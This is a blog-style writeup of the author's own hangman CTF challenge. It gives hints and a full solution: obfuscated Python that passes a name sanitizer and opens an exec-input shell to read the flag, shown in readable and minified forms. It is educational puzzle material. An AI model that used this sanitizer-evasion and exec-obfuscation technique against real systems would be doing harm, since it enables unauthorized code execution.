+++
title="Hangman Challenge Writeup"
date="2026-06-20"
+++

{% comment() %}
As part of [migrating](@/posts/2026-06-14-rebirth/index.md) from the old website, I'm moving the hangman challenge writeup here.
{% end %}

This is a writeup for my custom [hangman CTF challenge](https://hangman.danielc.rocks). As far as I know it's a completely original challenge; if anything I'm proud of the implementation and how real the terminal feels. The core idea came from talking with a friend about writing a python file that sanitizes to a fixed string, reminiscent of [quines](https://en.wikipedia.org/wiki/Quine_(computing)).

## Hints

Beware, below be spoilers...

{% spoiler(summary="Hint 1") %}
The hangman game really is [unbeatable](https://youtu.be/le5uGqHKll8?t=550). The goal of the challenge is to take advantage of the name loading and use that to read the flag.
{% end %}

{% spoiler(summary="Hint 2") %}
Look at the name verification function. If we can write some python code that sanitizes to `ErroryournamedoesntseemtobevalidIllcallyouMrUnimportant`, then we can input that as the name and it will pass the verification and thus be written to a file. Then we can run that file just like we ran `game.py`.

So the goal is: write a python file that reads `/flag.txt`, whose alphanumeric characters in order are `Erroryour...`.
{% end %}

{% spoiler(summary="Hint 3") %}
Can you spot any python keywords in the sanitized error message? Research the built-in python functions and see which ones might be useful.

We can have variables because underscores are allowed in python variable names.
Also we have numbers, by doing something like:

```py
_ = '' < '_' # one (compares ascii values)
__ = _+_+_+_ # four
___ = __*__ # sixteen
```
{% end %}

{% spoiler(summary="Solution") %}
What follows is one possible solution, that allows arbitrary code execution with a shell, so in particular you can read the flag file. Can you come up with an alternative?

For readability, I've named all variables something representative, but they can all be replaced with underscores (see the minified version). The solution uses a [trick](https://github.com/clemg/pythongolfer?tab=readme-ov-file#3---qa) of encoding a utf-8 string in utf-16 to garble it.

```py
'Erroryo'
U,R,N = 'urn'
'amedoesn'
T,S = 'ts'
'eemtob'
EVAL = eval
STR = EVAL(S+T+R)
I,D = 'id'
DIR = EVAL(D+I+R)
'IllcallyouMrUn'
ONE = ''<'_'
SEVEN = ONE+ONE+ONE+ONE+ONE+ONE+ONE
BUILTINS = STR(EVAL)[ONE:SEVEN-ONE]+I+N+S
FUNCS = DIR(EVAL('__import__("'+BUILTINS+'")'))
'ant'

EXEC = FUNCS[-SEVEN*SEVEN-ONE-ONE]
BYTES = FUNCS[-SEVEN*SEVEN-SEVEN-SEVEN-ONE-ONE]

# the garbage characters are a utf16 encoding of the utf8 shellcode, the decoded version is:
# while True: exec(input());

SHELLCODE = BYTES+'("桷汩⁥牔敵›硥捥椨灮瑵⤨㬩","'+U+STR(SEVEN+SEVEN+ONE+ONE)+'")['+STR(ONE+ONE)+':]'

EVAL(EXEC+'('+SHELLCODE+')')
```

And the minified version:

```py
'Erroryo';________,_____,_________='urn';'amedoesn';__________,______='ts';'eemtob';___=eval;____,___________='id';'IllcallyouMrUn';_=''<'_';__=_+_+_+_+_+_+_;___((____________:=___(___________+____+_____)(___('__import__("'+(_______:=___(______+__________+_____))(___)[_:__-_]+____+_________+______+'")')))[-__*__-_-_]+'('+____________[-__*__-__-__-_-_]+'("桷汩⁥牔敵›硥捥椨灮瑵⤨㬩","'+________+_______(__+__+_+_)+'")['+_______(_+_)+':]'+')');'ant'
```
{% end %}

## FAQs

{% spoiler(summary="How did you get Python to run in the browser???") %}
I talked to my comp-sci teacher who helps run this [educational tool](https://www.pythonsponge.com/) — and he told me about how they use [Pyodide](https://pyodide.org/en/stable/) and a [web worker](https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers). So I implemented that.
{% end %}

{% spoiler(summary="This is all client-side, so shouldn't I be able to cheese the flag by just looking in F12?") %}

Indeed there used to be a cheese solution by just going into F12 and realising that `init.py` contained the flag (thanks @xp3dx) — but I moved it >:)

I have no idea if the flag is still accessible like this because I don't know enough about Next.js, but I will tell you that in my Next.js app it's in `components/challenge.js` — feel free to try and hunt for it in whatever obfuscated garbage Next.js gives you...

{% end %}
